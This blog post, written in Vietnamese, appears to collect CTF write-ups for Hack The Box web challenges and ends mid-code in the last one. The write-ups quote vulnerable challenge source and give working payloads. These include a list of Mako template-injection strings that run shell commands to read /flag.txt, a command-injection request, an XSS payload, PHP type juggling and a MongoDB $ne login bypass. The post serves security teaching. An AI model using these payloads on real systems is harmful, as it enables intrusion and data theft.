---
title: "Htb business ctf 2024 the vault of hope - solved challenges in time"
excerpt: "May 18, 2024 08:00 PM ICT to May 22, 2024 08:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb-bussiness.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb-bussiness.jpg">
</p>

# Hack the box


## Trapped Source

- Đây là bài chỉ view source thôi

![image](https://hackmd.io/_uploads/SyGGk3RJ0.png)

![image](https://hackmd.io/_uploads/Hyr41h01C.png)


- Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến `/flag` và nhận flag.

![image](https://hackmd.io/_uploads/rJl51hCyR.png)


- Correct pin là : `9661` nhận flag nào:

![image](https://hackmd.io/_uploads/SJm3ynRkC.png)

Flag : `HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}`



## Spookifier


- Đây là một bài white box.

- Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.

- View source thì mình thấy có phần chính:

![image](https://hackmd.io/_uploads/H17fM2RkA.png)

- Và hàm spokier trông sẽ như thế này.

```
from mako.template import Template

font1 = {
	'A': '𝕬',
	'B': '𝕭',
	'C': '𝕮',
	'D': '𝕯',
	'E': '𝕰',
	'F': '𝕱',
	'G': '𝕲',
	'H': '𝕳',
	'I': '𝕴',
	'J': '𝕵',
	'K': '𝕶',
	'L': '𝕷',
	'M': '𝕸',
	'N': '𝕹',
	'O': '𝕺',
	'P': '𝕻',
	'Q': '𝕼',
	'R': '𝕽',
	'S': '𝕾',
	'T': '𝕿',
	'U': '𝖀',
	'V': '𝖁',
	'W': '𝖂',
	'X': '𝖃',
	'Y': '𝖄',
	'Z': '𝖅',
	'a': '𝖆',
	'b': '𝖇',
	'c': '𝖈',
	'd': '𝖉',
	'e': '𝖊',
	'f': '𝖋',
	'g': '𝖌',
	'h': '𝖍',
	'i': '𝖎',
	'j': '𝖏',
	'k': '𝖐',
	'l': '𝖑',
	'm': '𝖒',
	'n': '𝖓',
	'o': '𝖔',
	'p': '𝖕',
	'q': '𝖖',
	'r': '𝖗',
	's': '𝖘',
	't': '𝖙',
	'u': '𝖚',
	'v': '𝖛',
	'w': '𝖜',
	'x': '𝖝',
	'y': '𝖞',
	'z': '𝖟',
	' ': ' '
}

font2 = {
	'A': 'ᗩ', 
	'B': 'ᗷ',
	'C': 'ᑢ',
	'D': 'ᕲ',
	'E': 'ᘿ',
	'F': 'ᖴ',
	'G': 'ᘜ',
	'H': 'ᕼ',
	'I': 'ᓰ',
	'J': 'ᒚ',
	'K': 'ᖽᐸ',
	'L': 'ᒪ',
	'M': 'ᘻ',
	'N': 'ᘉ',
	'O': 'ᓍ',
	'P': 'ᕵ',
	'Q': 'ᕴ',
	'R': 'ᖇ',
	'S': 'S',
	'T': 'ᖶ',
	'U': 'ᑘ',
	'V': 'ᐺ',
	'W': 'ᘺ',
	'X': '᙭',
	'Y': 'Ɏ',
	'Z': 'Ⱬ',
	'a': 'ᗩ', 
	'b': 'ᗷ',
	'c': 'ᑢ',
	'd': 'ᕲ',
	'e': 'ᘿ',
	'f': 'ᖴ',
	'g': 'ᘜ',
	'h': 'ᕼ',
	'i': 'ᓰ',
	'j': 'ᒚ',
	'k': 'ᖽᐸ',
	'l': 'ᒪ',
	'm': 'ᘻ',
	'n': 'ᘉ',
	'o': 'ᓍ',
	'p': 'ᕵ',
	'q': 'ᕴ',
	'r': 'ᖇ',
	's': 'S',
	't': 'ᖶ',
	'u': 'ᑘ',
	'v': 'ᐺ',
	'w': 'ᘺ',
	'x': '᙭',
	'y': 'Ɏ',
	'z': 'Ⱬ',

	' ': ' '
}

font3 = {
	'A': '₳', 
	'B': '฿',
	'C': '₵',
	'D': 'Đ',
	'E': 'Ɇ',
	'F': '₣',
	'G': '₲',
	'H': 'Ⱨ',
	'I': 'ł',
	'J': 'J',
	'K': '₭',
	'L': 'Ⱡ',
	'M': '₥',
	'N': '₦',
	'O': 'Ø',
	'P': '₱',
	'Q': 'Q',
	'R': 'Ɽ',
	'S': '₴',
	'T': '₮',
	'U': 'Ʉ',
	'V': 'V',
	'W': '₩',
	'X': 'Ӿ',
	'Y': 'y̷',
	'Z': 'z̷',
	'a': '₳', 
	'b': '฿',
	'c': '₵',
	'd': 'Đ',
	'e': 'Ɇ',
	'f': '₣',
	'g': '₲',
	'h': 'Ⱨ',
	'i': 'ł',
	'j': 'J',
	'k': '₭',
	'l': 'Ⱡ',
	'm': '₥',
	'n': '₦',
	'o': 'Ø',
	'p': '₱',
	'q': 'Q',
	'r': 'Ɽ',
	's': '₴',
	't': '₮',
	'u': 'Ʉ',
	'v': 'V',
	'w': '₩',
	'x': 'Ӿ',
	'y': 'y̷',
	'z': 'z̷',
	' ': ''
} 

font4 = {
	'A': 'A', 
	'B': 'B',
	'C': 'C',
	'D': 'D',
	'E': 'E',
	'F': 'F',
	'G': 'G',
	'H': 'H',
	'I': 'I',
	'J': 'J',
	'K': 'K',
	'L': 'L',
	'M': 'M',
	'N': 'N',
	'O': 'O',
	'P': 'P',
	'Q': 'Q',
	'R': 'R',
	'S': 'S',
	'T': 'T',
	'U': 'U',
	'V': 'V',
	'W': 'W',
	'X': 'X',
	'Y': 'Y',
	'Z': 'Z',
	'a': 'a', 
	'b': 'b',
	'c': 'c',
	'd': 'd',
	'e': 'e',
	'f': 'f',
	'g': 'g',
	'h': 'h',
	'i': 'i',
	'j': 'j',
	'k': 'k',
	'l': 'l',
	'm': 'm',
	'n': 'n',
	'o': 'o',
	'p': 'p',
	'q': 'q',
	'r': 'r',
	's': 's',
	't': 't',
	'u': 'u',
	'v': 'v',
	'w': 'w',
	'x': 'x',
	'y': 'y',
	'z': 'z',
	'1': '1',
	'2': '2',
	'3': '3',
	'4': '4',
	'5': '5',
	'6': '6',
	'7': '7',
	'8': '8',
	'9': '9',
	'0': '0',
	'!': '!',
	'@': '@',
	'#': '#',
	'$': '$',
	'%': '%',
	'^': '^',
	'&': '&',
	'*': '*',
	'(': '(',
	')': ')',
	'-': '-',
	'_': '_',
	'+': '+',
	'=': '=',
	'{': '{',
	'}': '}',
	'[': '[',
	']': ']',
	'\\': '\\',
	'|': '|',
	';': ';',
	':': ':',
	'\'': '\'',
	'"': '"',
	'<': '<',
	',': ',',
	'>': '>',
	'.': '.',
	'?': '?',
	'/': '/'
	' ': ' ',
}

def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)


```

- Nhìn cái là biết luôn dính SSTI của template mako nha.


- Bây giờ thì thử [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako), flag nằm ở `/flag.txt` nhá.

- Dùng intruder check:

![image](https://hackmd.io/_uploads/SJrkN3A1A.png)


- Mình loay hoay khá lâu vì bình thường để nguyên thì kết quả đều là 0 hết chắc cho sever detect system hoặc là không có quyền chạy os :>, sau đó gpt thì tìm xem có cách khác để đọc file từ popen của os module.

![image](https://hackmd.io/_uploads/B1qoPh0JA.png)

- giờ mình thử xem có được không.
- ![image](https://hackmd.io/_uploads/rkdlA2CJR.png)


- Hehe có vẻ như nó không detect gì cả nên mình nhận được flag.

```
${self.module.cache.util.os.popen("cat /flag.txt").read()}
${self.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.template.module.cache.util.os.popen("cat /flag.txt").read()}
${self.module.cache.compat.inspect.os.popen("cat /flag.txt").read()}
${self.__init__.__globals__['util'].os.popen("cat /flag.txt").read()}
${self.template.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.module.filters.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.runtime.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.runtime.exceptions.util.os.popen("cat /flag.txt").read()}
${self.template.__init__.__globals__['os'].popen("cat /flag.txt").read()}
${self.module.cache.util.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.runtime.util.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.cache.util.os.popen("cat /flag.txt").read()}
${self.template.module.cache.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.cache.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.cache.util.os.popen("cat /flag.txt").read()}
${self.template.module.filters.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.filters.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.module.runtime.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.exceptions.util.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.cache.util.os.popen("cat /flag.txt").read()}
${self.module.runtime.exceptions.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template.module.cache.util.compat.inspect.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.module.cache.util.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.util.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.runtime.util.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.module.runtime.exceptions.traceback.linecache.os.popen("cat /flag.txt").read()}
${self.module.runtime.exceptions.util.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.cache.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template.module.cache.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.template.module.cache.util.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.filters.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.runtime.compat.inspect.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.popen("cat /flag.txt").read()}
${self.template._mmarker.module.runtime.exceptions.util.os.popen("cat /flag.txt").read()}
${self.template.module.filters.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.template.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.context._with_template._mmarker.module.cache.util.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.exceptions.compat.inspect.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.cache.compat.inspect.os.popen("cat /flag.txt").read()}
${self.module.runtime.exceptions.compat.inspect.linecache.os.popen("cat /flag.txt").read()}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.popen("cat /flag.txt").read()}
${self.context._with_template._mmarker.module.runtime.util.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.filters.compat.inspect.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.runtime.compat.inspect.os.popen("cat /flag.txt").read()}
${self.context._with_template.module.runtime.exceptions.util.os.popen("cat /flag.txt").read()}
${self.template.module.runtime.exceptions.traceback.linecache.os.popen("cat /flag.txt").read()}
```


Ngoài ra cũng có thể dùng `.open()` thay cho ``read()``.

![image](https://hackmd.io/_uploads/ryYD02RJR.png)


Flag : `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`




## Flag Command

- Đây là một bài view client source trong giải htb apocalypse nên cũng khá là đơn giản
- Giao diên dưới đây:
![image](https://hackmd.io/_uploads/ryE0eODSC.png)

- Như ta có thể thấy có một chức năng để gõ command-> gọi js từ main.js

```
<script type="module">
    import { startCommander, enterKey, userTextInput } from "/static/terminal/js/main.js";
    startCommander();

    window.addEventListener("keyup", enterKey);

    // event listener for clicking on the terminal
    document.addEventListener("click", function () {
      userTextInput.focus();
    });


  </script>
```

![image](https://hackmd.io/_uploads/rkWRWOwr0.png)

- Ở đây chú ý có một hàm gọi /api/options và ta quan sát 
![image](https://hackmd.io/_uploads/HkGeG_vHC.png)

- Có `secret` ở đây chắc nó phải có một tác dụng gì đó.
- Tiếp tục lại thấy một hàm fetch api/monitor

```
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
            .then((res) => res.json())
            .then(async (data) => {
                console.log(data)
                await displayLineInTerminal({ text: data.message });

                if(data.message.includes('Game over')) {
                    playerLost();
                    fetchingResponse = false;
                    return;
                }

                if(data.message.includes('HTB{')) {
                    playerWon();
                    fetchingResponse = false;

                    return;
                }

                if (currentCommand == 'HEAD NORTH') {
                    currentStep = '2';
                }
                else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
                    currentStep = '3'
                }
                else if (currentCommand == 'SET UP CAMP') {
                    currentStep = '4'
                }

                let lineBreak = document.createElement("br");


                beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
                displayLineInTerminal({ text: '<span class="command">You have 4 options!</span>' })
                displayLinesInTerminal({ lines: availableOptions[currentStep] })
                fetchingResponse = false;
            });


    }
    else {
        displayLineInTerminal({ text: "You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????" });
        fetchingResponse = false;
    }
}
```
- Nó nhận một json "command" và thực hiện post đến api/monitor và quan sát nếu có ``HTB{`` thì win vậy thì ta thử truyền secret vào command thử xem:
- ![image](https://hackmd.io/_uploads/BJx_XOwBC.png)

Flag: `HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}`


## KORP Terminal


![image](https://hackmd.io/_uploads/SJYVudDS0.png)

```
GET /?format=%Y-%m-%d';+cat+/flag' HTTP/1.1
Host: 94.237.54.176:46820
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1


```


Flag: `HTB{1t_i5_t1m3_f0r_ult1m4t3_pwn4g3!}`

## SpookTastic

- Phần mô tả cho chúng ta biết rằng chúng ta cần bật một cảnh báo để xác nhận bí mật ẩn giấu.
![image](https://hackmd.io/_uploads/B1WTw7yIC.png)
- Ta quan sát ở phần client chỉ thấy một đoạn js đơn giản:

```

btn.addEventListener("click", e => {
		e.preventDefault();
		fetch("/api/register", {
			method: "POST",
			body: JSON.stringify({
				email: document.getElementById("email").value
			}),
			headers: {
				"Content-Type": "application/json"
			}
		})
			.then(r => r.json())
			.then(r => {
				if (r.success) {
					alert("Thank you for signing up to our newsletter");
				}
			});
	});

	(() => {
		const socket = io();
		socket.on("flag", data => {
			console.log(data.flag);
			alert(data.flag);
		});
	})();
</script>
```

- Nếu mà ta click vào book now sẽ gọi đến hàm js trên thực hiện fetch api/register với giá trị của email.
- Sau đó gọi một IIFE funcion để kết nối socket và lắng nghe flag để hiển thị flag.
- Vì vậy nên chúng ta đi vào xem source code của chall:

```
import random, string
from flask import Flask, request, render_template, abort
from flask_socketio import SocketIO
from threading import Thread

app = Flask(__name__)

socketio = SocketIO(app)

registered_emails, socket_clients = [], {}

generate = lambda x: "".join([random.choice(string.hexdigits) for _ in range(x)])
BOT_TOKEN = generate(16)

def blacklist_pass(email):
    email = email.lower()

    if "script" in email:
        return False

    return True


def send_flag(user_ip):
    for id, ip in socket_clients.items():
        if ip == user_ip:
            socketio.emit("flag", {"flag": open("flag.txt").read()}, room=id)


def start_bot(user_ip):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    try:
        browser.get(f"{HOST}/bot?token={BOT_TOKEN}")

        WebDriverWait(browser, 3).until(EC.alert_is_present())

        alert = browser.switch_to.alert
        alert.accept()
        send_flag(user_ip)
    except Exception as e:
        pass
    finally:
        registered_emails.clear()
        browser.quit()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/register", methods=["POST"])
def register():
    if not request.is_json or not request.json["email"]:
        return abort(400)
    
    if not blacklist_pass(request.json["email"]):
        return abort(401)

    registered_emails.append(request.json["email"])
    Thread(target=start_bot, args=(request.remote_addr,)).start()
    return {"success":True}


@app.route("/bot")
def bot():
    if request.args.get("token", "") != BOT_TOKEN:
        return abort(404)
    return render_template("bot.html", emails=registered_emails)


@socketio.on("connect")
def on_connect():
    socket_clients[request.sid] = request.remote_addr


@socketio.on("disconnect")
def on_disconnect():
    del socket_clients[request.sid]


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)

```

- Quan sát đầu tiên ta có /api/register method POST sẽ nhận email sau đó sẽ filter blacklist :

```
def blacklist_pass(email):
    email = email.lower()

    if "script" in email:
        return False

    return True
```

- Sau đó `registered_emails.append` thêm vào mảng này giá trị của email.
- Có thể hiểu tại sao js gửi trực tiếp trong devtool nhưng không được vì:

```
def send_flag(user_ip):
    for id, ip in socket_clients.items():
        if ip == user_ip:
            socketio.emit("flag", {"flag": open("flag.txt").read()}, room=id)
```

- Phải ip nằm trong user_ip mới có thể nhận được flag.
- - Nó tạo một Thread để start_bot với arg là `request.remote_addr` và đầy là hàm start_bot:


```
def start_bot(user_ip):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    try:
        browser.get(f"{HOST}/bot?token={BOT_TOKEN}")

        WebDriverWait(browser, 3).until(EC.alert_is_present())

        alert = browser.switch_to.alert
        alert.accept()
        send_flag(user_ip)
    except Exception as e:
        pass
    finally:
        registered_emails.clear()
        browser.quit()
```

- Nó sử dụng thư viện selenium gọi đến localhost:1337/bot và ở /bot sẽ hiển thị trang bot.html


```
// bot.html
{% for email in emails %}
    <span>{{ email|safe }}</span><br/>
{% endfor %}
```

- có thể thấy trong này sẽ liệt kê tất cả những email với mode là safe.
- Vì vậy đây sẽ bị XSS. Nhưng mà làm sao để emit đến flag thì nó gọi đến hàm `send_flag(user_ip)` ở dưới đó luôn.
- Trước đó nó chuyển snags ngữ cảnh alert để hiển thị thanh cảnh báo
- Dùng XSS : `<img src=1 onerror=prompt()`
![image](https://hackmd.io/_uploads/HJp-pBJUC.png)

## Juggling facts

- Một chall php có các route như sau:

```

$router = new Router();
$router->new('GET', '/', 'IndexController@index');

$router->new('POST','/api/getfacts', 'IndexController@getfacts');
```
- Ta có thể thấy chỉ có 2 route chính:

```
/index
 public function index($router)
    {
        $router->view('index');
    }
```

- index chỉ để hiện thị trang index.


```
  public function getfacts($router)
    {
        $jsondata = json_decode(file_get_contents('php://input'), true);

        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }

        switch ($jsondata['type'])
        {
            case 'secrets':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('secrets')
                ]);

            case 'spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('spooky')
                ]);
            
            case 'not_spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('not_spooky')
                ]);
            
            default:
                return $router->jsonify([
                    'message' => 'Invalid type!'
                ]);
        }
    }
```

- Hàm này sẽ lấy php://input là một wrapper của php nó nhận global sau đó check nếu type === secrets và nếu ip khác localhot thì trả tin nhắn không thể access.
- Check với switch case:
- Nếu type `'facts' => $this->facts->get_facts('secrets')` chắn chắn thì đây là flag rồi nhưng mà ở trên ta thấy nếu type===secrets thì sẽ không cho access nhưng mà dưới này lại check.
- Nếu ta truyền type=true thì có thể bypass được :

![image](https://hackmd.io/_uploads/S10FOUy80.png)


![image](https://hackmd.io/_uploads/H12iuIJLR.png)

![image](https://hackmd.io/_uploads/HJL6OIkLR.png)

flag : `HTB{juggl1ng_1s_d4ng3r0u5!!!}`


## CandyVault

- Một chall với python + mogodb:
- Nhìn sơ qua thì mình đã đoán được trang web bị dính nosqli với mogodb, trước tiên thì đây là source code chính của server:

```
from flask import Flask, Blueprint, render_template, redirect, jsonify, request
from flask_bcrypt import Bcrypt
from pymongo import MongoClient

app = Flask(__name__)
app.config.from_object("application.config.Config")
bcrypt = Bcrypt(app)

client = MongoClient(app.config["MONGO_URI"])
db = client[app.config["DB_NAME"]]
users_collection = db["users"]

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]
    
    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    content_type = request.headers.get("Content-Type")

    if content_type == "application/x-www-form-urlencoded":
        email = request.form.get("email")
        password = request.form.get("password")

    elif content_type == "application/json":
        data = request.get_json()
        email = data.get("email")
        password = data.get("password")
    
    else:
        return jsonify({"error": "Unsupported Content-Type"}), 400

    user = users_collection.find_one({"email": email, "password": password})

    if user:
        return render_template("candy.html", flag=open("flag.txt").read())
    else:
        return redirect("/")

```

- có thể thấy /login với method GET và POST ở đây ta chỉ chú tâm với POST nó sẽ nhận email và password có thể nhận theo kiểu `application/x-www-form-urlencoded` hoặc `application/json` sau đó sẽ check với mongo nếu tốn tại user thỏa mãn thì sẽ trả ra flag cho chúng ta.
- ở đây ta sẽ lợi dụng json để truyền với payload nosqli:

![image](https://hackmd.io/_uploads/Hkgai8kLA.png)

![image](https://hackmd.io/_uploads/HyWg3I1U0.png)


![image](https://hackmd.io/_uploads/SkE7hIkIC.png)

![image](https://hackmd.io/_uploads/r11LhLJI0.png)

```
POST /login HTTP/1.1
Host: 94.237.63.201:41731
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 46
Origin: http://94.237.63.201:41731
Connection: close
Referer: http://94.237.63.201:41731/
Upgrade-Insecure-Requests: 1
Priority: u=1

{"email":{"$ne":null},"password":{"$ne":null}}
```

flag : `HTB{s4y_h1_t0_th3_c4andy_v4u1t!}`

## Jailbreak

- Chall đơn giản trong HTB-Business dính vul XXE:

![image](https://hackmd.io/_uploads/B1FMTU1UC.png)

- Quan sát qua chỉ có chức năng update-firmware là gửi api:

![image](https://hackmd.io/_uploads/BJpETU1IA.png)

![image](https://hackmd.io/_uploads/BJJ868kI0.png)

- Ta lập tức thử xxe để lấy flag.txt ở root:

![image](https://hackmd.io/_uploads/ByI9TIJL0.png)


![image](https://hackmd.io/_uploads/HkKqT8kUA.png)

flag : `HTB{bi0m3tric_l0cks_4nd_fl1ck3r1ng_l1ght5}`

## Cursed Secret Party

- Một chall với source code nodejs:

```
const express = require('express');
const app = express();
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const nunjucks = require('nunjucks');
const routes = require('./routes');
const Database = require('./database');

const db = new Database('party.db');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.use(cookieParser());

app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});


nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.set('views', './views');
app.use('/static', express.static('./static'));

app.use(routes(db));

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.use(function (err, req, res, next) {
    res.status(500).json({ message: 'Something went wrong!' });
});

(async () => {
    await db.connect();
    await db.migrate();
    app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

- Để ý thì trang web sẽ set middleware là một CSP :

```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});
```

- Server có route được config trong file ./route.js

```
app.use(routes(db));
```

```
const express = require('express');
const router = express.Router({ caseSensitive: true });
const AuthMiddleware = require('../middleware/AuthMiddleware');
const bot = require('../bot');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
    return res.render('index.html');
});

router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name && email && costume_type && trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});

router.get('/admin', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) => {
            res.render('admin.html', { requests: data });
        });
});

router.get('/admin/delete_all', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
    return db.remove_requests()
            .then(() => res.send(response('All records are deleted!')));
})

module.exports = database => {
    db = database;
    return router;
};
```

- Như bạn có thể thấy ở đây có 3 route chính nhưng trước hết thì ta sẽ kiếm vị trí của flag trước:

```
/bot.js
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');
const flag = fs.readFileSync('/flag.txt', 'utf8');

const browser_options = {
	headless: true,
	args: [
		'--no-sandbox',
		'--disable-background-networking',
		'--disable-default-apps',
		'--disable-extensions',
		'--disable-gpu',
		'--disable-sync',
		'--disable-translate',
		'--hide-scrollbars',
		'--metrics-recording-only',
		'--mute-audio',
		'--no-first-run',
		'--safebrowsing-disable-auto-update',
		'--js-flags=--noexpose_wasm,--jitless'
	]
};

const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
